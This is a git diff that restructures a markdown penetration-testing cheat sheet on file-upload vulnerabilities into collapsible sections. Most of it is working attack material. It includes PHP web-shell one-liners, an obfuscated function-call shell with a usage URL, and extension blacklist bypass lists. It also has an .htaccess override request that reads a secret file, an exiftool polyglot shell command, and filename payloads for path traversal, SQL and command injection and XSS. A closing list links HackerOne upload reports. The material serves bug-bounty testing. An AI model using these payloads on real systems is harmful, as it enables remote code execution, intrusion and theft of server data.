@@ -1,8 +1,10 @@
 # File-Upload
 
-> **File extension**
+<details>
 
-```
+<summary><strong>File Extension Fuzzing/Bypass</strong></summary>
+
+```html
 # extension blacklisted:
 PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
 ASP: .asp, .aspx, .cer, .asa
@@ -29,7 +31,11 @@ file.
 * [ ] Upload `asp` file using `.cer` & `.asa` extension (IIS — Windows)
 * [ ] Upload `.eml` file when `content-type = text/HTML`
 
-> _**Payloads**_
+</details>
+
+<details>
+
+<summary><em><strong>Payloads</strong></em></summary>
 
 ```php
 <?php system($_GET["cmd"]);?> # ?cmd= (ex: ?cmd=ls -la")
@@ -48,21 +54,33 @@ file.
 # Usage : http://target.com/path/to/shell.php?_=function&__=argument http://target.com/path/to/shell.php?_=system&__=ls
 ```
 
-> **Content type**
+</details>
+
+<details>
+
+<summary><strong>Content type</strong></summary>
 
 ```
 - Preserve name, but change content-type
 Content-Type: image/jpeg, image/gif, image/png
 ```
 
-> **Content length**
+</details>
+
+<details>
+
+<summary><strong>Content length Bypass</strong></summary>
 
 ```
 # Small bad code:
-<?='$_GET[x]'?>    
+<?='$_GET[x]'?>
 ```
 
-> **Impact by extension**
+</details>
+
+<details>
+
+<summary><strong>Impact/Exploitation by extension</strong></summary>
 
 ```go
 asp, aspx, php5, php, php3: -->  webshell, rce
@@ -77,55 +95,85 @@ zip:                        --> rce via lfi, dos
 pdf, pptx:                  --> ssrf, blind xxe
 ```
 
-> **File name**
+</details>
+
+<details>
+
+<summary><strong>File name Tests</strong></summary>
 
 * [ ] Path traversal `../../etc/passwd/logo.png` `../../../logo.png`
 * [ ] SQLi `'sleep(10).jpg` `sleep(10)-- -.jpg`
 * [ ] Command injection `; sleep 10;`
 * [ ] XSS `<svg onload=alert(document.comain)>.svg`
 
-> **Other Test Cases**
+</details>
 
-*   [ ] Image-Tragic SVG images are just XML data. Using XML you can achieve lots of vulnerabilities, for instance Image Magic which is an image processing library is vulnerable to SSRF and RCE vulnerabilities.
+<details>
 
-    Source (Facebook RCE): [Facebook's ImageTragick Remote Code Execution (4lemon.ru)](http://4lemon.ru/2017-01-17\_facebook\_imagetragick\_remote\_code\_execution.html)
-*   [ ] [**Web shell upload via extension blacklist bypass**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) **\[Overriding the server configuration]**
+<summary><strong>Image-Tragic</strong></summary>
 
-    ```php
-    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
-    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
-    Content-Type: text/plain
+SVG images are just XML data. Using XML you can achieve lots of vulnerabilities, for instance Image Magic which is an image processing library is vulnerable to SSRF and RCE vulnerabilities.
 
-    AddType application/x-httpd-php .l33t
-    ------------------------------------------
-    then 
-    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
-    Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
-    Content-Type: application/octet-stream
+{% embed url="https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html" %}
 
-    <?php echo file_get_contents('/home/carlos/secret'); ?>
-    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
-    ```
-*   [ ] [**Remote code execution via polyglot web shell upload**](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
+</details>
 
-    ```php
-    exiftool.exe -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
-    ```
-* [ ] EXIF-DATA not Stripped
-  1. Got to Github ( https://github.com/ianare/exif-samples/tree/master/jpg)\
+<details>
 
-  2. There are lot of images having resolutions (i.e 1280 \* 720 ) , and also whith different MB’s .\
+<summary><strong>Web shell upload via extension blacklist bypass</strong></summary>
 
-  3. Go to Upload option on the website\
+```http
+------WebKitFormBoundary0G2tBRqMoRVtGqfG
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
 
-  4. Upload the image\
+AddType application/x-httpd-php .l33t
+------------------------------------------
+then 
+------WebKitFormBoundary0G2tBRqMoRVtGqfG
+Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
+Content-Type: application/octet-stream
 
-  5. see the path of uploaded image ( Either by right click on image then copy image address OR right click, inspect the image, the URL will come in the inspect , edit it as html )
-  6. open it (http://exif.regex.info/exif.cgi)
-  7. See whether is that still showing exif data , if it is then Report it. **Reports (Hackerone)**
-  8. [IDOR with Geolocation data not stripped from images](https://hackerone.com/reports/906907)
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+------WebKitFormBoundary0G2tBRqMoRVtGqfG
+```
 
-> **File Upload Exploitation**
+</details>
+
+<details>
+
+<summary>Remote code execution via polyglot web shell upload</summary>
+
+{% embed url="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload" %}
+
+```php
+exiftool.exe -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
+```
+
+
+
+</details>
+
+<details>
+
+<summary><strong>EXIF-DATA not Stripped</strong></summary>
+
+1. Got to Github ( https://github.com/ianare/exif-samples/tree/master/jpg)\\
+2. There are lot of images having resolutions (i.e 1280 \* 720 ) , and also whith different MB’s .\\
+3. Go to Upload option on the website\\
+4. Upload the image\\
+5. see the path of uploaded image ( Either by right click on image then copy image address OR right click, inspect the image, the URL will come in the inspect , edit it as html )
+6. open it (http://exif.regex.info/exif.cgi)
+7. See whether is that still showing exif data , if it is then Report it. **Reports (Hackerone)**
+8. IDOR with Geolocation data not stripped from images
+
+{% embed url="https://hackerone.com/reports/906907" %}
+
+</details>
+
+<details>
+
+<summary><strong>File Upload Exploitations</strong></summary>
 
 *   **SVG file To XSS**
 
@@ -150,35 +198,42 @@ pdf, pptx:                  --> ssrf, blind xxe
         
     ```
 
-## Top Upload reports from HackerOne:
+</details>
 
-1. [Remote Code Execution on www.semrush.com/my\_reports on Logo upload](https://hackerone.com/reports/403417) to Semrush - 792 upvotes, $0
-2. [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) to Starbucks - 673 upvotes, $0
-3. [Blind XSS on image upload](https://hackerone.com/reports/1010466) to CS Money - 412 upvotes, $1000
-4. [Unrestricted file upload on \[ambassador.mail.ru\] ](https://hackerone.com/reports/854032)to Mail.ru - 404 upvotes, $3000
-5. [\[ RCE \] Through stopping the redirect in /admin/\* the attacker able to bypass Authentication And Upload Malicious File](https://hackerone.com/reports/683957) to Mail.ru - 340 upvotes, $0
-6. [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/808862) to Visma Public - 268 upvotes, $250
-7. [SSRF leaking internal google cloud data through upload function \[SSH Keys, etc..\]](https://hackerone.com/reports/549882) to Vimeo - 249 upvotes, $0
-8. [Arbitrary File Upload to Stored XSS](https://hackerone.com/reports/808821) to Visma Public - 245 upvotes, $250
-9. [Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg](https://hackerone.com/reports/1027822) to Starbucks - 225 upvotes, $0
-10. [Admin Management - Login Using Default Password - Leads to Image Upload Backdoor/Shell](https://hackerone.com/reports/699030) to Razer - 199 upvotes, $200
-11. [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) to TikTok - 139 upvotes, $2727
-12. [Unrestricted file upload in www.semrush.com > /my\_reports/api/v1/upload/image](https://hackerone.com/reports/748903) to Semrush - 124 upvotes, $0
-13. [User can upload files even after closing his account](https://hackerone.com/reports/1020371) to Basecamp - 114 upvotes, $0
-14. [XXE Injection through SVG image upload leads to SSRF](https://hackerone.com/reports/897244) to Zivver - 112 upvotes, $0
-15. [Insecure file upload in xiaoai.mi.com Lead to Stored XSS](https://hackerone.com/reports/882733) to Xiaomi - 107 upvotes, $0
-16. [Unrestricted File Upload on https://partner.tiktokshop.com/wsos\_v2/oec\_partner/upload](https://hackerone.com/reports/1890284) to TikTok - 98 upvotes, $0
-17. [\[insideok.ru\] Remote Command Execution via file upload.](https://hackerone.com/reports/666716) to ok.ru - 94 upvotes, $0
-18. [Avatar upload allows arbitrary file overwriting](https://hackerone.com/reports/671605) to Mail.ru - 88 upvotes, $750
-19. [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/880099) to GitLab - 82 upvotes, $0
-20. [Unauthenticated user can upload an attachment to the last updated report draft](https://hackerone.com/reports/419896) to HackerOne - 80 upvotes, $0
-21. [XSS from arbitrary attachment upload.](https://hackerone.com/reports/831703) to Qulture.Rocks - 74 upvotes, $0
-22. [Open s3 bucket allows for public upload](https://hackerone.com/reports/504600) to Augur - 73 upvotes, $100
-23. [SSRF and local file disclosure by video upload on https://www.redtube.com/upload](https://hackerone.com/reports/570537) to Pornhub - 61 upvotes, $500
-24. [Cross site scripting via file upload in subdomain ads.tiktok.com](https://hackerone.com/reports/1433125) to TikTok - 59 upvotes, $500
-25. [Unrestricted file upload when creating quotes allows for Stored XSS](https://hackerone.com/reports/788397) to Visma Public - 57 upvotes, $250
-26. [Singapore - Unrestricted File Upload Leads to XSS on campaign.starbucks.com.sg/api/upload](https://hackerone.com/reports/883151) to Starbucks - 57 upvotes, $0
-27. [Stored XSS on upload files leads to steal cookie](https://hackerone.com/reports/765679) to Palo Alto Software - 56 upvotes, $0
-28. [SSRF and local file disclosure by video upload on https://www.tube8.com/](https://hackerone.com/reports/574133) to Pornhub - 53 upvotes, $500
-29. [Unrestricted File Upload Results in Cross-Site Scripting Attacks](https://hackerone.com/reports/1005355) to Uber - 53 upvotes, $0
-30. [SSRF in VCARD photo upload functionality](https://hackerone.com/reports/296045) to Open-Xchange - 49 upvotes, $850
+<details>
+
+<summary><strong>Top Upload reports from HackerOne:</strong></summary>
+
+* [Remote Code Execution on www.semrush.com/my\_reports on Logo upload](https://hackerone.com/reports/403417) to Semrush - 792 upvotes, $0
+* [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) to Starbucks - 673 upvotes, $0
+* [Blind XSS on image upload](https://hackerone.com/reports/1010466) to CS Money - 412 upvotes, $1000
+* [Unrestricted file upload on \[ambassador.mail.ru\] ](https://hackerone.com/reports/854032)to Mail.ru - 404 upvotes, $3000
+* [\[ RCE \] Through stopping the redirect in /admin/\* the attacker able to bypass Authentication And Upload Malicious File](https://hackerone.com/reports/683957) to Mail.ru - 340 upvotes, $0
+* [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/808862) to Visma Public - 268 upvotes, $250
+* [SSRF leaking internal google cloud data through upload function \[SSH Keys, etc..\]](https://hackerone.com/reports/549882) to Vimeo - 249 upvotes, $0
+* [Arbitrary File Upload to Stored XSS](https://hackerone.com/reports/808821) to Visma Public - 245 upvotes, $250
+* [Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg](https://hackerone.com/reports/1027822) to Starbucks - 225 upvotes, $0
+* [Admin Management - Login Using Default Password - Leads to Image Upload Backdoor/Shell](https://hackerone.com/reports/699030) to Razer - 199 upvotes, $200
+* [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) to TikTok - 139 upvotes, $2727
+* [Unrestricted file upload in www.semrush.com > /my\_reports/api/v1/upload/image](https://hackerone.com/reports/748903) to Semrush - 124 upvotes, $0
+* [User can upload files even after closing his account](https://hackerone.com/reports/1020371) to Basecamp - 114 upvotes, $0
+* [XXE Injection through SVG image upload leads to SSRF](https://hackerone.com/reports/897244) to Zivver - 112 upvotes, $0
+* [Insecure file upload in xiaoai.mi.com Lead to Stored XSS](https://hackerone.com/reports/882733) to Xiaomi - 107 upvotes, $0
+* [Unrestricted File Upload on https://partner.tiktokshop.com/wsos\_v2/oec\_partner/upload](https://hackerone.com/reports/1890284) to TikTok - 98 upvotes, $0
+* [\[insideok.ru\] Remote Command Execution via file upload.](https://hackerone.com/reports/666716) to ok.ru - 94 upvotes, $0
+* [Avatar upload allows arbitrary file overwriting](https://hackerone.com/reports/671605) to Mail.ru - 88 upvotes, $750
+* [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/880099) to GitLab - 82 upvotes, $0
+* [Unauthenticated user can upload an attachment to the last updated report draft](https://hackerone.com/reports/419896) to HackerOne - 80 upvotes, $0
+* [XSS from arbitrary attachment upload.](https://hackerone.com/reports/831703) to Qulture.Rocks - 74 upvotes, $0
+* [Open s3 bucket allows for public upload](https://hackerone.com/reports/504600) to Augur - 73 upvotes, $100
+* [SSRF and local file disclosure by video upload on https://www.redtube.com/upload](https://hackerone.com/reports/570537) to Pornhub - 61 upvotes, $500
+* [Cross site scripting via file upload in subdomain ads.tiktok.com](https://hackerone.com/reports/1433125) to TikTok - 59 upvotes, $500
+* [Unrestricted file upload when creating quotes allows for Stored XSS](https://hackerone.com/reports/788397) to Visma Public - 57 upvotes, $250
+* [Singapore - Unrestricted File Upload Leads to XSS on campaign.starbucks.com.sg/api/upload](https://hackerone.com/reports/883151) to Starbucks - 57 upvotes, $0
+* [Stored XSS on upload files leads to steal cookie](https://hackerone.com/reports/765679) to Palo Alto Software - 56 upvotes, $0
+* [SSRF and local file disclosure by video upload on https://www.tube8.com/](https://hackerone.com/reports/574133) to Pornhub - 53 upvotes, $500
+* [Unrestricted File Upload Results in Cross-Site Scripting Attacks](https://hackerone.com/reports/1005355) to Uber - 53 upvotes, $0
+
+1. [SSRF in VCARD photo upload functionality](https://hackerone.com/reports/296045) to Open-Xchange - 49 upvotes, $850
+
+</details>
